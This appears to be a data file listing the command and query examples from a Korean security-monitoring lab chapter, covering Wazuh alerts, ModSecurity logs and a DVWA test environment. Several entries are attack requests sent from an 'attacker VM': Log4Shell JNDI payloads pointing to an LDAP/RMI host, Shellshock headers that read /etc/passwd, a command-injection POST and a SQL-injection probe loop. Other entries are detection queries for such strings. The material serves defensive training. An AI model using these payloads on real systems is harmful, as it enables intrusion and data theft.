@@ -1,0 +1,330 @@
+[
+  {
+    "document": "volume01-chapter07.json",
+    "section": "경보가 없을 때 원문 확인",
+    "id": "C07-01",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-01.txt",
+    "text": "docker exec -it kt66-web /bin/bash"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "경보가 없을 때 원문 확인",
+    "id": "C07-02",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-02.txt",
+    "text": "tail -n 20 /var/log/apache2/dvwa_access.log"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "경보가 없을 때 원문 확인",
+    "id": "C07-03",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-03.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감시 경로와 생성 전 확인",
+    "id": "C07-04",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-04.txt",
+    "text": "docker exec -it kt66-web /bin/bash"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감시 경로와 생성 전 확인",
+    "id": "C07-05",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-05.txt",
+    "text": "grep -n -F '/var/www' /var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감시 경로와 생성 전 확인",
+    "id": "C07-06",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-06.txt",
+    "text": "ls -ld /var/www/html/uploads"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "웹셸 코드 저장",
+    "id": "C07-07",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-07.txt",
+    "text": "ls -l /var/www/html/uploads/shell.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "웹셸 코드 저장",
+    "id": "C07-08",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-08.txt",
+    "text": "vim /var/www/html/uploads/shell.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "파일 확인과 웹 요청",
+    "id": "C07-09",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-09.txt",
+    "text": "cat /var/www/html/uploads/shell.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "파일 확인과 웹 요청",
+    "id": "C07-10",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-10.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "FIM 경보와 요청 검색",
+    "id": "Q07-01",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-01.txt",
+    "text": "agent.name: \"web\" AND rule.id: \"554\"\nAND syscheck.path: *shell.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "FIM 경보와 요청 검색",
+    "id": "Q07-02",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-02.txt",
+    "text": "agent.name: \"web\"\nAND data.url: *shell.php*"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "실습 파일 원상복구",
+    "id": "C07-11",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-11.txt",
+    "text": "docker exec -it kt66-web /bin/bash"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "실습 파일 원상복구",
+    "id": "C07-12",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-12.txt",
+    "text": "cat /var/www/html/uploads/shell.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "실습 파일 원상복구",
+    "id": "C07-13",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-13.txt",
+    "text": "rm -i /var/www/html/uploads/shell.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "원문에서 입력 찾기",
+    "id": "Q07-03",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-03.txt",
+    "text": "agent.name: \"web\"\nAND (full_log: *jndi* OR data.url: *jndi*)"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "변형 입력과 수집 한계",
+    "id": "Q07-04",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "file": "examples/rev02/chapter07/Q07-04.txt",
+    "text": "agent.name: \"web\"\nAND (full_log: *jndi* OR full_log: *lower*\n     OR data.url: *%24%7B*)"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "Shellshock 규칙 검색",
+    "id": "Q07-05",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-05.txt",
+    "text": "agent.name: \"web\"\nAND (rule.id: (31166 OR 31167 OR 31168 OR 31169)\n     OR rule.description: *Shellshock*)"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "접속 기록의 필드 해석",
+    "id": "Q07-06",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-06.txt",
+    "text": "agent.name: \"web\"\nAND data.url: (*vulnerabilities/exec/* OR *track-order*)"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "명령 문자열과 WAF 검색",
+    "id": "Q07-07",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-07.txt",
+    "text": "agent.name: \"web\" AND data.url:\n(*%3Bid* OR *;id* OR *%7Ccat* OR *cat%20*\n OR *whoami* OR *%24%28*)"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "명령 문자열과 WAF 검색",
+    "id": "Q07-08",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "file": "examples/rev02/chapter07/Q07-08.txt",
+    "text": "agent.name: \"web\"\nAND location: \"/var/log/apache2/modsec_audit.log\""
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "200 경보의 우선 조사",
+    "id": "Q07-09",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-09.txt",
+    "text": "agent.name: \"web\"\nAND (rule.id: \"31106\"\n OR (rule.groups: \"attack\" AND data.id: \"200\"))"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "SQL 인젝션 경보의 500",
+    "id": "Q07-10",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-10.txt",
+    "text": "agent.name: \"web\" AND data.id: 5*"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "반복 오류 규칙과 대응",
+    "id": "Q07-11",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-11.txt",
+    "text": "agent.name: \"web\"\nAND rule.id: (31161 OR 31162 OR 31163)"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "7.8  로그와 설정의 원본 위치",
+    "id": "C07-14",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-14.txt",
+    "text": "docker exec -it kt66-web /bin/bash"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "7.8  로그와 설정의 원본 위치",
+    "id": "C07-15",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-15.txt",
+    "text": "grep -n -F 'shell.php' \\\n  /var/log/apache2/landing_access.log"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "7.8  로그와 설정의 원본 위치",
+    "id": "C07-16",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-16.txt",
+    "text": "grep -n -E 'ServerName|DocumentRoot|ProxyPass|SecRuleEngine' \\\n  /etc/apache2/sites-enabled/*.conf"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감사 기록과 앱 처리기 조회",
+    "id": "C07-17",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-17.txt",
+    "text": "tail -n 5 /var/log/apache2/modsec_audit.log"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감사 기록과 앱 처리기 조회",
+    "id": "C07-18",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-18.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감사 기록과 앱 처리기 조회",
+    "id": "C07-19",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-19.txt",
+    "text": "docker exec -it kt66-dvwa /bin/bash"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감사 기록과 앱 처리기 조회",
+    "id": "C07-20",
+    "where": "kt66-dvwa · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-20.txt",
+    "text": "cat /var/www/html/vulnerabilities/exec/source/low.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감사 기록과 앱 처리기 조회",
+    "id": "C07-21",
+    "where": "kt66-dvwa · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-21.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "Manager의 규칙 정의 조회",
+    "id": "C07-22",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-22.txt",
+    "text": "docker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "Manager의 규칙 정의 조회",
+    "id": "C07-23",
+    "where": "kt66-siem · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-23.txt",
+    "text": "grep -n -A 16 -F 'id=\"31106\"' \\\n  /var/ossec/ruleset/rules/0245-web_rules.xml"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "7.9  curl 요청 실습(선택)",
+    "id": "C07-24",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-24.txt",
+    "text": "curl --version"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "JNDI 헤더와 URL",
+    "id": "C07-25",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-25.txt",
+    "text": "curl -i --max-time 15 --get \\\n  -A '${jndi:ldap://192.168.0.108:1389/a}' \\\n  --data-urlencode \\\n  'q=${jndi:ldap://192.168.0.108:1389/a}' \\\n  http://dvwa.ccc.com/"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "JNDI 변형 헤더",
+    "id": "C07-26",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-26.txt",
+    "text": "curl -i --max-time 15 \\\n  -H \\\n'X-Api-Version: ${${lower:j}ndi:ldap://192.168.0.108:1389/b}' \\\n  -A '${jndi:rmi://192.168.0.108:1099/c}' \\\n  http://dvwa.ccc.com/"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "Shellshock의 두 헤더",
+    "id": "C07-27",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-27.txt",
+    "text": "curl -i --max-time 15 \\\n  -A '() { :; }; /bin/bash -c \"id\"' \\\n  http://juice.ccc.com/cgi-bin/test.cgi"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "Shellshock의 두 헤더",
+    "id": "C07-28",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-28.txt",
+    "text": "curl -i --max-time 15 \\\n  -H 'Referer: () { :; }; /bin/bash -c \"cat /etc/passwd\"' \\\n  http://dvwa.ccc.com/cgi-bin/status"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "POST 본문과 인증 상태",
+    "id": "C07-29",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-29.txt",
+    "text": "curl -i --max-time 15 \\\n  --data 'ip=127.0.0.1;id&Submit=Submit' \\\n  http://dvwa.ccc.com/vulnerabilities/exec/"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "원본 반복문의 구문",
+    "id": "C07-30",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-30.txt",
+    "text": "for i in $(seq 1 20); do\n  curl -sS --max-time 15 -o /dev/null \\\n    -w \"%{http_code} \" \\\n    \"http://juice.ccc.com/rest/products/search?q=%27$i\"\ndone\nprintf \"\\n\""
+  }
+]
